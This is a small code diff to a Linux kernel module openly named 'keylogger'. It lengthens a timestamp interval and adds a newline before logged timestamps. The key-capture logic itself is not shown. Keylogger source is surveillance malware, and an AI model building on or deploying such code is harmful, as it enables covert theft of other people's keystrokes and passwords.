@@ -21,7 +21,7 @@
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
 #define MAX_PENDING_CHARS 32 // Đủ dài cho tổ hợp phím như [Ctrl+Alt+Del]
-#define TIME_LOG_INTERVAL (10 * HZ)
+#define TIME_LOG_INTERVAL (60 * HZ)
 
 static dev_t dev_num;
 static struct cdev keylogger_cdev;
@@ -129,7 +129,7 @@ static void time_log_func(struct timer_list *t) {
     printk(KERN_DEBUG "Time log function called\n"); // Debug
     ktime_get_real_ts64(&ts);
     time64_to_tm(ts.tv_sec, 0, &tm);
-    snprintf(time_str, sizeof(time_str), "[%04ld-%02d-%02d %02d:%02d:%02d]\n",
+    snprintf(time_str, sizeof(time_str), "\n[%04ld-%02d-%02d %02d:%02d:%02d]\n",
              tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
              tm.tm_hour, tm.tm_min, tm.tm_sec);
 
